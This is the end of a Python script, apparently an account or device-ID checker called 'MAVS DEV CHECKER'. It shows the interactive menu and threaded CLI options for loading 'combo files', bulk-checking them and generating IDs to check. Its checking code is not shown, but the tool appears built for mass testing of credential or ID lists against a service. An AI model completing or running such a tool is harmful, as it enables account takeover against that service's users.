# ============================================================
# MAIN
# ============================================================

def main():
    while True:
        display_banner()
        choice = display_main_menu()

        if choice == '1':
            display_banner()
            file_manager = AccountFileManager()
            combo_files = file_manager.scan_combo_folder()
            if not combo_files:
                print(f'\n  {_RD}No combo files in Combo/ folder.{_RST}\n')
                input(f'  {_DIM}Press Enter…{_RST} ')
                continue
            file_infos = [info for fp in combo_files for info in [file_manager.get_file_info(fp)] if info]
            if file_infos:
                with _selected_file_lock:
                    global _selected_file
                    _selected_file = _select_file_menu(file_infos)
            else:
                print(f'\n  {_RD}No valid combo files.{_RST}\n')
                input(f'  {_DIM}Press Enter…{_RST} ')

        elif choice == '2':
            display_banner()
            bulk_check()

        elif choice == '3':
            display_banner()
            generate_and_check()

        elif choice == '4':
            print(f'\n  {_DIM}Goodbye.{_RST}\n')
            sys.exit(0)

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description='MAVS DEV CHECKER — interactive menu (no args) or CLI mode (--file).'
    )
    parser.add_argument('--file', help='Input file with device IDs (enables CLI mode)')
    parser.add_argument('--threads', type=int, default=5,
                        help='Number of worker threads (default: 5)')
    parser.add_argument('--output',
                        help='Output directory for results (default: Results/<name>_<timestamp>)')
    parser.add_argument('--auto-remove', action='store_true',
                        help='Remove checked lines from the input file after checking')
    args = parser.parse_args()

    try:
        if args.file:
            rc = run_cli_check(
                input_file=args.file,
                num_threads=max(1, args.threads),
                output_dir=args.output,
                auto_remove=args.auto_remove,
            )
            sys.exit(rc)
        else:
            main()
    except KeyboardInterrupt:
        print(f'\n  {_YL}⚠  Script terminated by user.{_RST}\n')
    except Exception as e:
        import traceback
        print(f'\n  {_RD}✖  Unexpected error: {e}{_RST}')
        traceback.print_exc()
        sys.exit(1)
